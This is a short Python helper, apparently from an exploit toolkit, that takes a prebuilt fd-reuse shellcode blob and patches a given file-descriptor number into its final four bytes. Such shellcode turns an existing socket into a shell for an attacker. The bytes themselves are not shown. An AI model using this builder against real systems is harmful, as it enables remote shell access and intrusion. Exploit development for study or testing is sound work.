from reusefd_shellcode import reusefd_shellcode

def reusefd(fd):
	import struct
	params = struct.pack("<I", int(fd))
	return reusefd_shellcode[:-4] + params

